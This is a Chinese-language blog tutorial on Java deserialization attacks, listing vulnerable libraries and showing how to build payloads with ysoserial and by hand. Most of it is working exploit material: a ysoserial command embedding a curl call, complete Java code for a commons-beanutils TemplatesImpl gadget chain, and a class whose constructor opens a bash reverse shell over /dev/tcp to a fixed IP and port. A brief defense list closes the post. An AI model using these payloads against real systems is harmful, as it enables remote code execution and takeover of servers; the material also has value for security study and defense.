---
title: java反序列化攻击.md
date: 2022-10-03 16:56:48
tag:
- 信息安全
- 网络攻防
- java
- 反序列化
categories: 
- 网络
- 网络安全

---

# WHAT: 反序列化攻击是什么?
有些应用可能会把对象序列化成bytes(或者字符串)，然后再反序列化回对象。
这个过程中，如果用户能修改序列化后的字符串（或者bytes），就可能注入恶意的代码，从而控制目标机器。

以java为例，可能应用会用`writeObject`序列化对象成bytes，
然后`readObject`反序列化回对象。如果应用中有这部分逻辑，就得提防反序列化漏洞了。

# HOW: 怎么构造一个反序列化攻击
除了`commons-collections 3.1`可以用来利用java反序列化漏洞，还有更多第三方库同样可以用来利用反序列化漏洞并执行任意代码，部分如下：
> commons-fileupload 1.3.1
commons-io 2.4
commons-collections 3.1
commons-logging 1.2
commons-beanutils 1.9.2
org.slf4j:slf4j-api 1.7.21
com.mchange:mchange-commons-java 0.2.11
org.apache.commons:commons-collections 4.0
com.mchange:c3p0 0.9.5.2
org.beanshell:bsh 2.0b5
org.codehaus.groovy:groovy 2.3.9

## 使用工具构造payload
可以使用ysoserial: https://github.com/search?q=ysoserial
在已知目标程序依赖了哪些有漏洞的库的前提下，选择对应类型来生成payload:
```shell script
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
九月 29, 2022 6:36:29 下午 org.reflections.Reflections scan
信息: Reflections took 182 ms to scan 1 urls, producing 18 keys and 153 values
     Payload             Authors                                Dependencies
     -------             -------                                ------------
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                               commons-collections:3.1
     CommonsCollections2 @frohoff                               commons-collections4:4.0
     CommonsCollections3 @frohoff                               commons-collections:3.1
     CommonsCollections4 @frohoff                               commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                               groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser                       js:1.7R2
     MozillaRhino2       @_tint0                                js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                              rome:1.0
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```

比如如果已知目标程序依赖了`CommonsBeanutils1`对应的依赖`commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2`，
则可以：
```shell script
java -jar ysoserial-all.jar CommonsBeanutils1 'curl 172.20.26.42:8081' | base64
```
生成执行base64的payload。

## 手动构造
可以参考：https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html

手动构造需要写代码，比较繁琐。所以我们以简化的情景来假设。
假设我们直接有了目标程序的jar包，则可以解压得到依赖库(lib目录)，然后新建一个Java项目，把依赖jar包全导入进去。
假设目标程序依赖了`commons-beanutils-1.9.2`，我们从mvn核心库可以看到它存在CVE:
https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils/1.9.2
{% img /images/2022-09/cve.png 800 1200 cve %}

mvn中央仓库专门有一列`Vulnerabilities`来标示存在`vulnerability`(弱点、漏洞)的库版本。
(类似于sqlmap中提示某字段是vulnerable的)

根据参考资料，我们可以用`BeanComparator`来构造一个反序列化的攻击。
创建一个优先队列，把`Comparator`设置成`BeanComparator`，然后塞进2个元素，再强行通过反射换掉元素。


```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;
import org.springframework.util.comparator.BooleanComparator;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;

public class Test {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void printPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, BooleanComparator.TRUE_HIGH);
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        // stub data for replacement later
        queue.add(false);
        queue.add(true);

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[] {obj, obj});

        // ==================
        // 生成序列化字符串
        write(queue);
    }

    public static void write(Object obj) throws Exception {
        // System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        objectOutputStream.close();
        System.out.println("base64:");
        String base64Str = new String(Base64.getEncoder().encode(baos.toByteArray()));
        System.out.println(base64Str);
        System.out.println("base64 end");

        tryDecode(base64Str);
    }

    private static void tryDecode(String base64Str) {
        byte[] res = Base64.getDecoder().decode(base64Str.getBytes());
        InputStream in = new ByteArrayInputStream(res);
        try {
            ObjectInputStream ois = new ObjectInputStream(in);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(HelloTemplatesImpl.class.getName());
        printPayload(clazz.toBytecode());
    }
}
```
如上所示我们就可以注入任意想要执行的代码(`HelloTemplatesImpl`)了。

譬如我们可以在它的构造函数里放入想要执行的恶意代码(反向shell):
```java
import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
public class HelloTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {
    }

    public HelloTemplatesImpl() {
        super();
        System.out.println("Hello TemplatesImpl");
        Runtime r = Runtime.getRuntime();
        Process p;
        try {
            p = r.exec(new String[] {"/bin/bash", "-c",
                    "exec 5<>/dev/tcp/172.29.53.149/5279;cat <&5 | while read line; do $line 2>&5 >&5; done"});
            p.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println("End TemplatesImpl");

    }
}
```

# 如何防范
1。对于依赖的库，定期在mvn中心仓库检查`Vulnerabilities`列，如果有CVE，尽量及早升级到安全版本；
2。尽量不反序列化生成对象；
3。不要信任用户输入；

# 参考资料
https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html
https://github.com/phith0n/JavaThings/blob/master/shiroattack/src/main/java/com/govuln/shiroattack/CommonsBeanutils1Shiro.java